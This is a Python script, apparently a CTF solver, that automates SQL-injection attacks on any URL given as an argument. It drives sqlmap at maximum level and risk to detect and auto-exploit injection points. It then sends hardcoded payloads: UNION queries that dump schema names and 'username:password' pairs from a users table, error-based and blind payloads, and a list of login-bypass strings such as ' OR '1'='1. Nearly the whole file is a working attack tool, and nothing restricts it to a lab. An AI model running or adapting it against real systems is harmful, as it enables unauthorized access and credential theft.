#!/usr/bin/env python3
"""
最终版CTF解题脚本
用于解决SQL注入CTF挑战
"""

import asyncio
import sys
import json
import argparse
from pathlib import Path
from datetime import datetime

# 添加项目根目录到Python路径
sys.path.insert(0, str(Path(__file__).parent))

from src.utils.logger import setup_logger
from src.mcp_server.tools.sqlmap_wrapper import SQLMapWrapper


class CTFSolver:
    """CTF挑战解题器"""
    
    def __init__(self, verbose=True):
        self.logger = setup_logger("ctf_solver", log_level="DEBUG" if verbose else "INFO")
        self.verbose = verbose
        self.sqlmap_wrapper = SQLMapWrapper()
        
    async def initialize(self):
        """初始化"""
        self.logger.info("初始化CTF挑战解题器...")
        
        # 测试SQLMap连接
        connected = await self.sqlmap_wrapper.test_connection()
        if not connected:
            self.logger.error("SQLMap连接测试失败")
            return False
        
        self.logger.info("✅ SQLMap连接成功")
        return True
    
    async def solve_sql_injection(self, target_url, request_file=None, username_param="username", password_param="password"):
        """
        解决SQL注入CTF挑战
        
        Args:
            target_url: 目标URL
            request_file: 请求文件路径（可选）
            username_param: 用户名参数名
            password_param: 密码参数名
        """
        print("\n" + "="*80)
        print("CTF SQL注入解题器")
        print("="*80)
        print(f"目标: {target_url}")
        print(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*80)
        
        results = {
            "solver_version": "1.0.0",
            "start_time": datetime.now().isoformat(),
            "target": target_url,
            "challenge_type": "sql-injection",
            "flags_found": [],
            "vulnerabilities": [],
            "tools_used": ["sqlmap"],
            "phases_completed": [],
            "success": False,
            "detailed_steps": []
        }
        
        try:
            # 阶段1: 检测漏洞
            print("\n🔍 阶段1: 检测SQL注入漏洞...")
            
            if request_file and Path(request_file).exists():
                self.logger.info(f"使用请求文件: {request_file}")
                scan_result = await self.sqlmap_wrapper.scan_with_request_file(
                    request_file,
                    level=5,
                    risk=3,
                    threads=10
                )
            else:
                self.logger.info(f"直接扫描URL: {target_url}")
                scan_result = await self.sqlmap_wrapper.scan(
                    target_url,
                    level=5,
                    risk=3,
                    threads=10
                )
            
            step1 = {
                "step": "vulnerability_detection",
                "result": {
                    "success": scan_result.get("success", False),
                    "vulnerabilities": scan_result.get("vulnerabilities", []),
                    "vulnerability_count": len(scan_result.get("vulnerabilities", []))
                }
            }
            
            results["detailed_steps"].append(step1)
            results["vulnerabilities"] = scan_result.get("vulnerabilities", [])
            
            if not scan_result.get("vulnerabilities"):
                print("❌ 未发现SQL注入漏洞")
                return results
            
            print(f"✅ 发现 {len(scan_result['vulnerabilities'])} 个漏洞")
            results["phases_completed"].append("vulnerability_detection")
            
            # 阶段2: 自动利用
            print("\n⚡ 阶段2: 自动利用漏洞...")
            exploit_result = await self.sqlmap_wrapper.auto_exploit(
                target_url,
                level=5,
                risk=3,
                threads=10
            )
            
            step2 = {
                "step": "auto_exploitation",
                "result": exploit_result
            }
            
            results["detailed_steps"].append(step2)
            
            if exploit_result.get("success"):
                results["phases_completed"].append("exploitation")
                
                # 检查是否找到flag
                if exploit_result.get("flag"):
                    flag = exploit_result["flag"]
                    print(f"\n🎉🎉🎉 找到Flag: {flag} 🎉🎉🎉")
                    results["flags_found"].append(flag)
                    results["success"] = True
                else:
                    # 检查数据中是否包含flag
                    print("🔍 检查数据中是否包含flag...")
                    for table_key, table_data in exploit_result.get("data", {}).items():
                        for record in table_data:
                            for key, value in record.items():
                                if isinstance(value, str):
                                    import re
                                    flag_patterns = [
                                        r'flag\{[^}]+\}',
                                        r'FLAG\{[^}]+\}',
                                        r'ctf\{[^}]+\}',
                                        r'CTF\{[^}]+\}',
                                        r'[A-Za-z0-9]{32}',
                                        r'[A-Za-z0-9]{64}',
                                    ]
                                    for pattern in flag_patterns:
                                        match = re.search(pattern, value)
                                        if match:
                                            flag = match.group()
                                            print(f"\n🎉🎉🎉 在数据中找到Flag: {flag} 🎉🎉🎉")
                                            results["flags_found"].append(flag)
                                            results["success"] = True
                                            break
                                    
                                    if results["success"]:
                                        break
                            
                            if results["success"]:
                                break
                        
                        if results["success"]:
                            break
                    
                    if not results["success"] and exploit_result.get("data"):
                        print("✅ 成功获取数据但未找到明确flag格式")
                        results["success"] = True  # 部分成功
            
            # 阶段3: 手动尝试常见payload
            if not results["success"]:
                print("\n🔧 阶段3: 尝试手动payload...")
                await self._try_manual_payloads(target_url, results, username_param, password_param)
            
            # 生成报告
            await self._generate_report(results)
            
            return results
            
        except Exception as e:
            self.logger.error(f"解题过程中出现错误: {e}")
            import traceback
            self.logger.error(traceback.format_exc())
            
            results["error"] = str(e)
            return results
        finally:
            results["end_time"] = datetime.now().isoformat()
    
    async def _try_manual_payloads(self, target_url, results, username_param, password_param):
        """尝试手动payload"""
        import requests
        
        # 首先尝试万能密码注入
        print("\n🔑 尝试万能密码注入...")
        universal_password_success = await self._try_universal_password_injection(
            target_url, results, username_param, password_param
        )
        
        if universal_password_success:
            return
        
        # 如果万能密码失败，尝试其他payload
        print("\n🔧 尝试其他SQL注入payload...")
        
        # 常见SQL注入payload
        payloads = [
            # 联合查询payload
            f"admin' UNION SELECT 1,2,3--",
            f"admin' UNION SELECT database(),user(),version()--",
            f"admin' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
            f"admin' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
            f"admin' UNION SELECT 1,group_concat(username,':',password),3 FROM users--",
            
            # 布尔盲注payload
            f"admin' AND 1=1--",
            f"admin' AND 1=2--",
            
            # 报错注入payload
            f"admin' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
            f"admin' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
            
            # 时间盲注payload
            f"admin' AND sleep(5)--",
        ]
        
        print(f"尝试 {len(payloads)} 个手动payload...")
        
        for i, payload in enumerate(payloads[:10]):  # 只尝试前10个
            try:
                # 构建请求
                params = {username_param: payload, password_param: "test"}
                response = requests.get(target_url, params=params, timeout=10)
                
                # 检查响应中是否包含flag
                import re
                flag_patterns = [
                    r'flag\{[^}]+\}',
                    r'FLAG\{[^}]+\}',
                    r'ctf\{[^}]+\}',
                    r'CTF\{[^}]+\}',
                ]
                
                for pattern in flag_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        flag = match.group()
                        print(f"\n🎉 使用payload {i+1} 找到Flag: {flag}")
                        results["flags_found"].append(flag)
                        results["success"] = True
                        results["phases_completed"].append("manual_exploitation")
                        return
                
                # 检查响应中是否有数据库信息
                db_keywords = ["mysql", "database", "sql", "syntax", "error", "warning"]
                if any(keyword in response.text.lower() for keyword in db_keywords):
                    print(f"  Payload {i+1}: 可能有效 (发现数据库关键词)")
            
            except Exception as e:
                print(f"  Payload {i+1}: 错误 - {e}")
    
    async def _try_universal_password_injection(self, target_url, results, username_param, password_param):
        """尝试万能密码注入"""
        import requests
        
        # 万能密码payload列表
        universal_passwords = [
            # 经典万能密码
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "admin", "password": "' OR 1=1--"},
            {"username": "admin", "password": "' OR 'a'='a"},
            {"username": "admin", "password": "' OR ''='"},
            
            # 变体
            {"username": "' OR '1'='1", "password": "anything"},
            {"username": "admin' OR '1'='1'--", "password": "anything"},
            {"username": "admin'--", "password": "anything"},
            {"username": "admin'#", "password": "anything"},
            
            # 双引号变体
            {"username": "admin", "password": '" OR "1"="1'},
            {"username": '" OR "1"="1', "password": "anything"},
            
            # 无引号变体
            {"username": "admin", "password": " OR 1=1"},
            {"username": " OR 1=1", "password": "anything"},
            
            # 管理员万能密码
            {"username": "admin", "password": "admin' OR '1'='1"},
            {"username": "administrator", "password": "' OR '1'='1"},
            
            # 注释变体
            {"username": "admin'/*", "password": "*/ OR '1'='1"},
            {"username": "admin'-- -", "password": "anything"},
            {"username": "admin'#", "password": "anything"},
        ]
        
        print(f"尝试 {len(universal_passwords)} 个万能密码组合...")
        
        for i, creds in enumerate(universal_passwords):
            try:
                # 构建请求参数
                params = {
                    username_param: creds["username"],
                    password_param: creds["password"]
                }
                
                # 尝试GET请求
                response = requests.get(target_url, params=params, timeout=10)
                
                # 检查响应中是否包含flag
                import re
                flag_patterns = [
                    r'flag\{[^}]+\}',
                    r'FLAG\{[^}]+\}',
                    r'ctf\{[^}]+\}',
                    r'CTF\{[^}]+\}',
                    r'登录成功|登录成功|success|welcome|dashboard|admin',
                ]
                
                # 检查flag
                for pattern in flag_patterns[:4]:  # 只检查flag模式
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        flag = match.group()
                        print(f"\n🎉 使用万能密码组合 {i+1} 找到Flag: {flag}")
                        results["flags_found"].append(flag)
                        results["success"] = True
                        results["phases_completed"].append("universal_password_injection")
                        
                        # 记录使用的payload
                        results["universal_password_used"] = {
                            "username": creds["username"],
                            "password": creds["password"]
                        }
                        return True
                
                # 检查登录成功迹象
                success_keywords = ["登录成功", "登录成功", "success", "welcome", "dashboard", "admin", "logout", "退出"]
                if any(keyword in response.text.lower() for keyword in [k.lower() for k in success_keywords]):
                    print(f"  ✓ 万能密码组合 {i+1}: 可能登录成功")
                    
                    # 尝试POST请求（如果GET失败）
                    try:
                        post_response = requests.post(target_url, data=params, timeout=10)
                        
                        # 再次检查flag
                        for pattern in flag_patterns[:4]:
                            match = re.search(pattern, post_response.text, re.IGNORECASE)
                            if match:
                                flag = match.group()
                                print(f"\n🎉 使用POST请求找到Flag: {flag}")
                                results["flags_found"].append(flag)
                                results["success"] = True
                                results["phases_completed"].append("universal_password_injection")
                                
                                # 记录使用的payload
                                results["universal_password_used"] = {
                                    "username": creds["username"],
                                    "password": creds["password"],
                                    "method": "POST"
                                }
                                return True
                    except:
                        pass
                
                # 检查响应长度变化（可能表示成功）
                if i == 0:
                    baseline_length = len(response.text)
                else:
                    current_length = len(response.text)
                    if abs(current_length - baseline_length) > 100:  # 响应长度显著变化
                        print(f"  ⚠️  万能密码组合 {i+1}: 响应长度变化 ({baseline_length} -> {current_length})")
                        
                        # 检查是否有数据库错误信息
                        error_keywords = ["mysql", "sql", "syntax", "error", "warning", "exception"]
                        if any(keyword in response.text.lower() for keyword in error_keywords):
                            print(f"    发现数据库错误信息，可能存在SQL注入")
            
            except Exception as e:
                print(f"  ✗ 万能密码组合 {i+1}: 错误 - {e}")
        
        return False
    
    async def _generate_report(self, results):
        """生成解题报告"""
        self.logger.info("生成解题报告...")
        
        # 计算耗时
        if results["start_time"] and results["end_time"]:
            start = datetime.fromisoformat(results["start_time"])
            end = datetime.fromisoformat(results["end_time"])
            results["duration"] = str(end - start)
        
        # 创建报告目录
        reports_dir = Path("reports")
        reports_dir.mkdir(exist_ok=True)
        
        # 生成文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = results["target"].replace("://", "_").replace("/", "_").replace(":", "_")
        report_file = reports_dir / f"ctf_solve_{target_safe}_{timestamp}.json"
        
        # 保存JSON报告
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"报告已保存: {report_file}")
        
        # 打印摘要
        self._print_summary(results)
        
        return str(report_file)
    
    def _print_summary(self, results):
        """打印解题摘要"""
        print("\n" + "="*80)
        print("CTF解题完成摘要")
        print("="*80)
        print(f"目标: {results['target']}")
        print(f"挑战类型: {results.get('challenge_type', 'unknown')}")
        
        if 'duration' in results:
            print(f"耗时: {results['duration']}")
        
        print(f"完成阶段: {', '.join(results.get('phases_completed', []))}")
        print(f"发现漏洞: {len(results.get('vulnerabilities', []))}")
        print(f"找到Flag: {len(results.get('flags_found', []))}")
        
        if results.get('flags_found'):
            print("\n🎉 发现的Flag:")
            for flag in results['flags_found']:
                print(f"  {flag}")
        
        print(f"\n成功: {'✅ 是' if results.get('success') else '❌ 否'}")
        
        # 打印漏洞详情
        if results.get('vulnerabilities'):
            print("\n漏洞详情:")
            for i, vuln in enumerate(results['vulnerabilities'], 1):
                print(f"  {i}. {vuln.get('type', '未知')} - {vuln.get('parameter', '未知参数')}")
        
        print("="*80)


async def main():
    """主函数"""
    parser = argparse.ArgumentParser(description="CTF SQL注入解题脚本")
    parser.add_argument("target", help="目标URL")
    parser.add_argument("-r", "--request-file", help="请求文件路径（包含HTTP请求）")
    parser.add_argument("-u", "--username-param", default="username", 
                       help="用户名参数名（默认: username）")
    parser.add_argument("-p", "--password-param", default="password", 
                       help="密码参数名（默认: password）")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    
    args = parser.parse_args()
    
    # 创建解题器
    solver = CTFSolver(verbose=args.verbose)
    
    try:
        # 初始化
        print("初始化CTF解题器...")
        success = await solver.initialize()
        if not success:
            print("❌ 解题器初始化失败")
            return 1
        
        print("✅ 解题器初始化成功")
        
        # 解决挑战
        results = await solver.solve_sql_injection(
            target_url=args.target,
            request_file=args.request_file,
            username_param=args.username_param,
            password_param=args.password_param
        )
        
        # 根据结果返回退出码
        if results.get("success"):
            print("\n✅ 解题成功！")
            return 0
        else:
            print("\n⚠️  解题未完全成功")
            return 1
            
    except KeyboardInterrupt:
        print("\n\n解题被用户中断")
        return 130
    except Exception as e:
        print(f"\n❌ 解题失败: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code)